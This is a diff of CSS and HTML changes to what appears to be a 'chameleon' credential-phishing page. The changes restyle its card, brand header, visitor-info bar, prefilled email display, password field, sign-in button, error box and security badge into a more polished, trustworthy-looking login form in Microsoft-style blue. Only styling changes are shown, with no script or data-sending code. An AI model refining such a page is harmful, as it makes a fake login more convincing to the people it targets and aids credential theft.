@@ -101,51 +101,65 @@
       to { transform: rotate(360deg); }
     }
     
-    /* --- CHAMELEON CONTAINER --- */
+    /* --- MODERN ELEVATED FLOATING CARD --- */
     .chameleon-container {
       width: 100%;
       max-width: 560px;
       background: #ffffff;
-      border-radius: 12px;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4), 0 4px 20px rgba(0, 0, 0, 0.08);
+      border-radius: 16px;
+      box-shadow: 
+        0 4px 6px rgba(0, 0, 0, 0.02),
+        0 8px 30px rgba(0, 0, 0, 0.08),
+        0 20px 60px rgba(0, 0, 0, 0.12),
+        0 40px 80px rgba(0, 0, 0, 0.06);
       overflow: hidden;
       display: none;
       position: relative;
       z-index: 10;
       animation: fadeIn 0.6s ease;
-      border: 1px solid rgba(200, 200, 200, 0.15);
+      transition: transform 0.3s ease, box-shadow 0.4s ease;
+    }
+    
+    .chameleon-container:hover {
+      box-shadow: 
+        0 8px 12px rgba(0, 0, 0, 0.02),
+        0 12px 40px rgba(0, 0, 0, 0.10),
+        0 30px 80px rgba(0, 0, 0, 0.15),
+        0 50px 100px rgba(0, 0, 0, 0.08);
+      transform: translateY(-4px);
     }
     
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px) scale(0.97); }
+      from { opacity: 0; transform: translateY(24px) scale(0.97); }
       to { opacity: 1; transform: translateY(0) scale(1); }
     }
     
     /* Brand Header - Company Name Only */
     .brand-header {
-      padding: 24px 30px 16px;
+      padding: 28px 30px 18px;
       text-align: center;
-      border-bottom: 1px solid #dbeafe;
-      background: #f0f7ff;
+      border-bottom: 1px solid #f0f0f0;
+      background: #ffffff;
     }
     
     .brand-name {
       font-size: 22px;
       font-weight: 700;
       color: #1a1a1a;
+      letter-spacing: -0.3px;
     }
     
     /* Visitor Info Bar */
     .visitor-info {
-      background: #f8fafc;
-      padding: 8px 20px;
+      background: #fafbfc;
+      padding: 10px 22px;
       display: flex;
       flex-wrap: wrap;
       justify-content: space-between;
       align-items: center;
       font-size: 12px;
       color: #555;
-      border-bottom: 1px solid #e8e8e8;
+      border-bottom: 1px solid #f0f0f0;
       gap: 4px 12px;
     }
     
@@ -173,30 +187,30 @@
     
     /* Content */
     .chameleon-content {
-      padding: 24px 30px 20px;
+      padding: 28px 30px 24px;
     }
     
     .hero-title {
       font-size: 20px;
       font-weight: 700;
       color: #1a1a1a;
-      margin-bottom: 2px;
+      margin-bottom: 4px;
     }
     
     .hero-sub {
       font-size: 14px;
       color: #666;
-      margin-bottom: 16px;
+      margin-bottom: 18px;
     }
     
     .email-display {
-      background: #f0f7ff;
-      padding: 10px 16px;
-      border-radius: 6px;
+      background: #f5f8ff;
+      padding: 12px 16px;
+      border-radius: 8px;
       font-size: 15px;
       font-weight: 600;
       color: #1a1a1a;
-      margin-bottom: 18px;
+      margin-bottom: 20px;
       word-break: break-all;
       border-left: 4px solid #0078d4;
     }
@@ -207,7 +221,7 @@
     }
     
     .form-group {
-      margin-bottom: 14px;
+      margin-bottom: 16px;
     }
     
     .form-group label {
@@ -215,7 +229,7 @@
       font-size: 13px;
       font-weight: 600;
       color: #333;
-      margin-bottom: 4px;
+      margin-bottom: 5px;
     }
     
     .input-with-icon {
@@ -225,18 +239,18 @@
     .input-with-icon input {
       width: 100%;
       padding: 12px 12px 12px 44px;
-      border: 2px solid #e0e0e0;
-      border-radius: 8px;
+      border: 2px solid #e8e8e8;
+      border-radius: 10px;
       font-size: 15px;
-      transition: border 0.3s, box-shadow 0.3s;
+      transition: border-color 0.3s, box-shadow 0.3s;
       background: #fafafa;
+      outline: none;
     }
     
     .input-with-icon input:focus {
       border-color: #0078d4;
-      outline: none;
-      background: #fff;
-      box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.1);
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.08);
     }
     
     .input-with-icon .icon {
@@ -265,7 +279,7 @@
     .checkbox-group {
       display: flex;
       align-items: center;
-      margin: 12px 0 16px;
+      margin: 14px 0 18px;
     }
     
     .checkbox-group input {
@@ -286,15 +300,20 @@
       background: #0078d4;
       color: #fff;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       font-size: 16px;
       font-weight: 700;
       cursor: pointer;
-      transition: background 0.3s;
+      transition: background 0.3s, transform 0.15s;
     }
     
     .btn-submit:hover {
       background: #106ebe;
+      transform: scale(1.01);
+    }
+    
+    .btn-submit:active {
+      transform: scale(0.98);
     }
     
     .auth-error {
@@ -305,13 +324,13 @@
       text-align: center;
       background: #fef2f2;
       padding: 8px 12px;
-      border-radius: 6px;
+      border-radius: 8px;
       border: 1px solid #fecaca;
     }
     
     .footer-links {
       text-align: center;
-      margin-top: 14px;
+      margin-top: 16px;
       font-size: 13px;
       color: #666;
     }
@@ -326,9 +345,9 @@
     }
     
     .security-badge {
-      background: #f8fafc;
-      border-top: 1px solid #e8e8e8;
-      padding: 12px;
+      background: #fafbfc;
+      border-top: 1px solid #f0f0f0;
+      padding: 14px;
       text-align: center;
       font-size: 12px;
       color: #94a3b8;
@@ -370,12 +389,16 @@
       .chameleon-container {
         border-radius: 0;
         box-shadow: none;
+        transform: none !important;
+      }
+      .chameleon-container:hover {
+        transform: none !important;
       }
       .brand-header {
-        padding: 16px;
+        padding: 20px 16px 14px;
       }
       .chameleon-content {
-        padding: 16px;
+        padding: 20px 16px;
       }
       .visitor-info {
         font-size: 11px;
@@ -398,7 +421,7 @@
     </div>
   </div>
 
-  <!-- CHAMELEON CONTAINER -->
+  <!-- MODERN ELEVATED FLOATING CARD -->
   <div class="chameleon-container" id="chameleonContainer">
     
     <!-- Brand Header - Company Name Only -->
